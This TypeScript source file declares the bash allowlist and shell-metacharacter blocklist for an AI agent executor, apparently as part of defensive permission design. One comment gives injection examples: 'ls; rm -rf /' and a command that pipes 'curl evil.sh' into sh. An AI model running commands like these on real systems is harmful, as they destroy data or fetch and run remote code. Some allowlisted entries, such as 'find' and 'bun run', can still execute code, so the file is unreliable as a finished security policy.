// Executor permission policy. We run with `permissionMode: 'acceptEdits'`
// (decision §5 of the scaffold review) inside a scoped workspace, plus a
// conservative bash allowlist. Security-review will harden this later.

/** Bash commands that auto-approve in `acceptEdits` mode. Anything not
 *  matched falls through to the SDK's prompt machinery (and in a voice
 *  TUI, that means we deny — there's no good UX for mid-call prompts).
 *
 *  MATCHING CONTRACT — read before adding entries.
 *
 *  Entries are matched **against parsed argv tokens, NOT against the raw
 *  command string**. A naive prefix-on-string match is unsafe: `'ls '`
 *  would let `ls; rm -rf /` through, and `'git diff'` would let
 *  `git diff && curl evil.sh | sh` through. So:
 *
 *    1. Reject any candidate containing shell metacharacters before even
 *       looking at the allowlist. The blocklist below is conservative; any
 *       of these → DENY.
 *
 *           ; & | < > ` $( $\{ \\ \n  (and unbalanced quotes)
 *
 *    2. Tokenize the surviving candidate into argv (shell-quote style — a
 *       real parser, not split-on-whitespace). Compare its leading tokens
 *       against each allowlist entry's leading tokens (also tokenized).
 *
 *           candidate "git diff src/foo.ts"   argv = ["git","diff","src/foo.ts"]
 *           entry     "git diff"              argv = ["git","diff"]
 *           → match: candidate's first 2 tokens deep-equal entry's argv.
 *
 *    3. A bare entry like 'ls' matches any candidate whose argv[0] is 'ls'
 *       regardless of subsequent flags/paths. A two-token entry like
 *       'git diff' requires argv[0]+argv[1] to match exactly.
 *
 *  This makes the contract argv-prefix, not string-prefix. The candidate's
 *  remaining tokens (flags, file args) are then trusted because step 1
 *  already removed every way to escape into a second command.
 *
 *  IMPLEMENTATION lives in the executor PR — this file just declares the
 *  contract + the data the matcher consumes. The matcher itself will be a
 *  small pure function with unit tests covering: metachar injection,
 *  argv-prefix vs string-prefix divergence, quoted args, and equivalence
 *  classes (`git  diff` vs `git diff`).
 *
 *  TODO(security-review): broaden carefully; each addition is a new way
 *  for a hallucinated tool call to run code. */
export const BASH_ALLOWLIST: readonly string[] = [
  // Reading the workspace.
  'ls',
  'cat',
  'head',
  'tail',
  'wc',
  'pwd',
  'echo',
  'grep',
  'rg',
  'find',
  // Git — read-only subcommands only.
  'git status',
  'git diff',
  'git log',
  'git show',
  'git branch',
  // Builds + tests. Each requires the subcommand token to match.
  'bun run',
  'bun test',
  'bun install',
  'npm test',
  'pnpm test',
]

/** Shell metacharacters whose presence in a candidate command should reject
 *  the entire command before the allowlist matcher runs. Step 1 of the
 *  contract above. */
export const SHELL_METACHARACTERS: readonly string[] = [
  ';',
  '&',
  '|',
  '<',
  '>',
  '`',
  '$(',
  '${',
  '\\',
  '\n',
]

export type ExecutorPermissionPolicy = {
  /** Allow file edits without prompting. */
  permissionMode: 'acceptEdits'
  /** Working directory the executor is scoped to. */
  cwd: string
  /** Argv-prefix allowlist for bash (see contract above). */
  bashAllowlist: readonly string[]
  /** Metacharacters that reject the entire command. */
  shellMetacharacters: readonly string[]
}

export function defaultPermissionPolicy(cwd: string): ExecutorPermissionPolicy {
  return {
    permissionMode: 'acceptEdits',
    cwd,
    bashAllowlist: BASH_ALLOWLIST,
    shellMetacharacters: SHELL_METACHARACTERS,
  }
}
